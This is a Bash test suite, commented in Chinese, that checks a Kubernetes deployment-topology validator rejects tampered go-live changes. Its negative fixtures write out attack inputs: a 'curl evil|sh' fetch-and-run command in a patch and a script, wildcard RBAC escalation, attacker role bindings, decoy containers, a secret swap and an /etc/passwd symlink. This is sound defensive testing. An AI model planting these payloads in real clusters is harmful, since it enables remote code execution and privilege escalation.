#!/usr/bin/env bash
# 验 verify-runner-topology.sh（runner go-live 拓扑 lane 校验器）——闭世界 canonical render-diff。
#   正例：合法 go-live PR（resources +deployment+external-secrets / replicas 0→1 / 删 launcher deferred，
#         pin 数据全不变）→ pass。
#   反例（Codex 两轮红队全清单）：任何改 pin / 夹带 / 诱饵 / patches/transformer 篡改渲染 / 既有资源提权 /
#         重复键 / 多文档 → fail-closed，且**匹配预期错误串**（防假绿）。
# ★harness 硬化（Codex 抓假绿）：set -e；每个夹具构造后校验成功；负例匹配唯一预期错误子串；
#   独立 tmp 输出（$$）；依赖缺失才 skip（明示，非静默成功）。
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
VERIFY="${SCRIPT_DIR}/verify-runner-topology.sh"
RUNNER_SRC="${REPO_ROOT}/apps/aster-lang/runner"
OUT="/tmp/topo_test.$$.out"
FAILED=0
pass() { echo "  ✓ $1"; }
fail() { echo "  ✗ $1"; FAILED=1; }

for c in yq jq kubectl python3; do command -v "$c" >/dev/null || { echo "::error::依赖缺失（${c}），无法运行 topology 测试 → 非通过"; exit 2; }; done
[[ -d "$RUNNER_SRC" ]] || { echo "::error::找不到 runner 源目录 ${RUNNER_SRC} → 非通过"; exit 2; }

LAUNCHER="docker.io/wontlost/aster-runner-launcher"

# 构造合法 go-live {base, head} 夹具（fixture 构造失败即硬中止，防假绿）。
# ★base 恒规范化为**pre-go-live 态**（不论仓库当前 tree 是 pre 还是 post go-live——#111 合入后当前 tree
#   已 go-live'd，故须先把 base 逆变换回 pre-go-live，再对 head 施加 go-live 迁移；否则 base 已 go-live 会
#   造 head 重复加 resources/无 deferral 可删）。pre-go-live = deployment/external-secrets 不在 resources +
#   replicas 0 + launcher 在 deferredImages。
mk_golive() {
  local root; root="$(mktemp -d)" || { echo "FATAL: mktemp 失败"; exit 2; }
  mkdir -p "$root/base" "$root/head" || { echo "FATAL: mkdir 失败"; exit 2; }
  cp "$RUNNER_SRC"/*.yaml "$root/base/" || { echo "FATAL: cp base 失败"; exit 2; }
  # base 逆变换→pre-go-live（幂等：条已不在则 no-op；replicas 已 0/deferral 已有则不变）。
  yq -i 'del(.resources[] | select(. == "deployment.yaml" or . == "external-secrets.yaml"))' "$root/base/kustomization.yaml" || { echo "FATAL: base 逆变换 resources 失败"; exit 2; }
  yq -i '.spec.replicas = 0' "$root/base/deployment.yaml" || { echo "FATAL: base 逆变换 replicas 失败"; exit 2; }
  yq -i "(.deferredImages // []) |= (map(select(.image != \"$LAUNCHER\")) + [{\"image\": \"$LAUNCHER\", \"reason\": \"pre-go-live fixture\"}])" "$root/base/deploy-policy.yaml" || { echo "FATAL: base 逆变换 deferral 失败"; exit 2; }
  cp "$root/base/"*.yaml "$root/head/" || { echo "FATAL: cp head 失败"; exit 2; }
  # head 施加三项授权 go-live 迁移。
  yq -i '.resources += ["deployment.yaml", "external-secrets.yaml"]' "$root/head/kustomization.yaml" || { echo "FATAL: yq resources 失败"; exit 2; }
  yq -i '.spec.replicas = 1' "$root/head/deployment.yaml" || { echo "FATAL: yq replicas 失败"; exit 2; }
  yq -i ".deferredImages = [.deferredImages[] | select(.image != \"$LAUNCHER\")]" "$root/head/deploy-policy.yaml" || { echo "FATAL: yq deploy-policy 失败"; exit 2; }
  echo "$root"
}

# 正例：期望 pass（EXIT 0）。
expect_pass() {  # $1=root $2=desc
  local root="$1" desc="$2" rc
  set +e; bash "$VERIFY" "$root/base" "$root/head" >"$OUT" 2>&1; rc=$?; set -e
  [[ "$rc" == "0" ]] && pass "${desc}（合法 go-live 放行）" \
    || fail "${desc}：合法 go-live 被误拒（rc=${rc}）：$(tail -2 "$OUT")"
  rm -rf "$root"
}

# 反例：期望 fail-closed（EXIT≠0）**且**错误串含 $3。
expect_fail() {  # $1=root $2=desc $3=预期错误子串
  local root="$1" desc="$2" want="$3" rc
  set +e; bash "$VERIFY" "$root/base" "$root/head" >"$OUT" 2>&1; rc=$?; set -e
  if [[ "$rc" == "0" ]]; then
    fail "${desc}：★未 fail-closed（EXIT 0）——BYPASS!"
  elif ! grep -qE "$want" "$OUT"; then
    fail "${desc}：fail-closed 但错误串不符（期望含「${want}」）：$(grep '::error::' "$OUT" | tail -1)"
  else
    pass "${desc}（fail-closed：$(grep '::error::' "$OUT" | tail -1 | sed 's/::error:://' | cut -c1-50)）"
  fi
  rm -rf "$root"
}

echo "=== 正例：合法 go-live PR → pass ==="
expect_pass "$(mk_golive)" "正例"

echo "=== 反例组 A：pin 数据篡改 ==="
r="$(mk_golive)"; yq -i "(.images[]|select(.image==\"$LAUNCHER\")).digest=\"sha256:7777777777777777777777777777777777777777777777777777777777777777\"" "$r/head/image-lock.yaml"; expect_fail "$r" "image-lock 篡改" "非授权文件|image-lock"
r="$(mk_golive)"; yq -i "(.images[]|select(.name==\"$LAUNCHER\")).digest=\"sha256:8888888888888888888888888888888888888888888888888888888888888888\"" "$r/head/kustomization.yaml"; expect_fail "$r" "kustomization.images 篡改" "kustomization.images 必须与 base"
r="$(mk_golive)"; yq -i '(.spec.template.spec.containers[0].env[]|select(.name=="RUNNER_IMAGE_DIGEST")).value="sha256:9999999999999999999999999999999999999999999999999999999999999999"' "$r/head/deployment.yaml"; expect_fail "$r" "RUNNER_IMAGE_DIGEST 篡改" "render 全等"

echo "=== 反例组 B：kustomize transformer/patches（闭世界核心）==="
r="$(mk_golive)"; printf 'apiVersion: apps/v1\nkind: Deployment\nmetadata: {name: runner-launcher, namespace: aster-runner}\nspec: {template: {spec: {containers: [{name: runner-launcher, command: ["/bin/sh","-c","curl evil|sh"]}]}}}\n' > "$r/head/cmd.yaml"; yq -i '.patches=[{"path":"cmd.yaml"}]' "$r/head/kustomization.yaml"; expect_fail "$r" "patches 注入 command" "目录文件集变更|kustomization 非 resources"
r="$(mk_golive)"; printf 'apiVersion: apps/v1\nkind: Deployment\nmetadata: {name: runner-launcher, namespace: aster-runner}\nspec: {template: {spec: {serviceAccountName: cluster-admin-sa}}}\n' > "$r/head/sa.yaml"; yq -i '.patches=[{"path":"sa.yaml"}]' "$r/head/kustomization.yaml"; expect_fail "$r" "patches 改 SA" "目录文件集变更|kustomization 非 resources"
r="$(mk_golive)"; yq -i '.commonLabels={"evil":"1"}' "$r/head/kustomization.yaml"; expect_fail "$r" "commonLabels transformer" "kustomization 非 resources 变更"
r="$(mk_golive)"; yq -i '.namePrefix="evil-"' "$r/head/kustomization.yaml"; expect_fail "$r" "namePrefix transformer" "kustomization 非 resources 变更"

echo "=== 反例组 C：既有 resource 内容篡改（提权）==="
r="$(mk_golive)"; yq -i '.rules=[{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}]' "$r/head/role.yaml"; expect_fail "$r" "role.yaml 提权" "非授权文件|render 全等"
r="$(mk_golive)"; yq -i '.subjects=[{"kind":"User","name":"attacker","apiGroup":"rbac.authorization.k8s.io"}]' "$r/head/rolebinding.yaml"; expect_fail "$r" "rolebinding subjects 篡改" "非授权文件|render 全等"
r="$(mk_golive)"; yq -i '.automountServiceAccountToken=false' "$r/head/serviceaccount.yaml"; expect_fail "$r" "serviceaccount 篡改（真改）" "非授权文件|render 全等"

echo "=== 反例组 D：deployment 载体/诱饵 ==="
r="$(mk_golive)"; yq -i '.spec.template.spec.containers += [{"name":"h","image":"evil/x@sha256:1111111111111111111111111111111111111111111111111111111111111111"}]' "$r/head/deployment.yaml"; expect_fail "$r" "诱饵容器" "render 全等"
r="$(mk_golive)"; yq -i '.spec.template.spec.containers[0].image="ghcr.io/evil@sha256:2222222222222222222222222222222222222222222222222222222222222222"' "$r/head/deployment.yaml"; expect_fail "$r" "image name→evil" "render 全等"
r="$(mk_golive)"; yq -i '.spec.template.spec.initContainers=[{"name":"i","image":"evil/x@sha256:3333333333333333333333333333333333333333333333333333333333333333"}]' "$r/head/deployment.yaml"; expect_fail "$r" "initContainer 注入" "render 全等"
r="$(mk_golive)"; yq -i '.spec.replicas=5' "$r/head/deployment.yaml"; expect_fail "$r" "replicas 0→5" "render 全等"
r="$(mk_golive)"; yq -i '.spec.template.spec.serviceAccountName="cluster-admin-sa"' "$r/head/deployment.yaml"; expect_fail "$r" "deployment 改 SA" "render 全等"
r="$(mk_golive)"; yq -i '.spec.template.spec.containers[0].securityContext.readOnlyRootFilesystem=false' "$r/head/deployment.yaml"; expect_fail "$r" "放松 securityContext" "render 全等"
r="$(mk_golive)"; yq -i '(.spec.template.spec.containers[0].env[]|select(.name=="ASTER_RUNNER_LAUNCHER_HMAC_KEY")).valueFrom.secretKeyRef.name="attacker-secret"' "$r/head/deployment.yaml"; expect_fail "$r" "HMAC secret 换名" "render 全等"

echo "=== 反例组 E：resources delta / external-secrets ==="
r="$(mk_golive)"; printf 'apiVersion: v1\nkind: ConfigMap\nmetadata: {name: evil, namespace: aster-runner}\ndata: {x: "1"}\n' > "$r/head/evil.yaml"; yq -i '.resources += ["evil.yaml"]' "$r/head/kustomization.yaml"; expect_fail "$r" "夹带 evil resource" "目录文件集变更|resources delta"
r="$(mk_golive)"; yq -i '.resources = (.resources - ["external-secrets.yaml"])' "$r/head/kustomization.yaml"; expect_fail "$r" "缺 external-secrets" "resources delta"
r="$(mk_golive)"; yq -i '.spec.data += [{"secretKey":"extra","remoteRef":{"key":"apps/other","property":"x"}}]' "$r/head/external-secrets.yaml"; expect_fail "$r" "external-secrets 加 data" "非授权文件"

echo "=== 反例组 F：deploy-policy ==="
r="$(mk_golive)"; yq -i ".deferredImages=[{\"image\":\"$LAUNCHER\",\"reason\":\"x\"}]" "$r/head/deploy-policy.yaml"; expect_fail "$r" "保留 launcher deferred" "仍含 launcher deferred"
r="$(mk_golive)"; yq -i '.deferredImages += [{"image":"docker.io/other/img","reason":"smuggle"}]' "$r/head/deploy-policy.yaml"; expect_fail "$r" "加其它豁免" "deploy-policy"

echo "=== 反例组 G：YAML 结构攻击（重复键/多文档）==="
r="$(mk_golive)"; printf '\nspec:\n  replicas: 9\n' >> "$r/head/deployment.yaml"; expect_fail "$r" "deployment 重复 key" "严格解析失败"
r="$(mk_golive)"; printf '\n---\napiVersion: v1\nkind: ConfigMap\nmetadata: {name: sneaky, namespace: aster-runner}\n' >> "$r/head/external-secrets.yaml"; expect_fail "$r" "external-secrets 多文档" "非授权文件|多文档"

echo "=== 反例组 H：目录内容闭世界（Codex 契约收紧）==="
r="$(mk_golive)"; printf 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata: {name: evil, namespace: aster-runner}\nspec: {podSelector: {}}\n' > "$r/head/network-policy.yaml"; expect_fail "$r" "篡改未引用 network-policy" "非授权文件"
r="$(mk_golive)"; printf 'apiVersion: v1\nkind: ConfigMap\nmetadata: {name: backdoor, namespace: aster-runner}\ndata: {x: "1"}\n' > "$r/head/backdoor.yaml"; expect_fail "$r" "新增未引用 backdoor.yaml" "目录文件集变更"
r="$(mk_golive)"; printf '#!/bin/sh\ncurl evil|sh\n' > "$r/head/evil.sh"; expect_fail "$r" "新增非-YAML evil.sh" "目录文件集变更"
r="$(mk_golive)"; rm -f "$r/head/service.yaml"; expect_fail "$r" "删除既有文件" "目录文件集变更"
r="$(mk_golive)"; ln -sf /etc/passwd "$r/head/evil-link.yaml" 2>/dev/null && expect_fail "$r" "符号链接" "符号链接|目录文件集" || { echo "  (跳过符号链接：ln 失败)"; rm -rf "$r"; }

echo "=== 反例组 I：YAML alias（token 级检测）==="
r="$(mk_golive)"; printf '\nanchored: &a {k: v}\naliased: *a\n' >> "$r/head/deployment.yaml"; expect_fail "$r" "block alias" "严格解析失败"
r="$(mk_golive)"; python3 -c "import sys; f='$r/head/deployment.yaml'; c=open(f).read(); open(f,'w').write(c+'\nflowlist: [&x 1, *x]\n')"; expect_fail "$r" "flow-style alias [*x]" "严格解析失败"

echo ""
if [[ "$FAILED" == "0" ]]; then
  echo "全部通过（正例放行 + 全反例 fail-closed 且错误串匹配：pin 不变 + 闭世界既有对象不变 + 新增对象受控 + 严格 YAML）。"; rm -f "$OUT"; exit 0
else
  echo "存在失败用例，见上方 ✗。"; rm -f "$OUT"; exit 1
fi
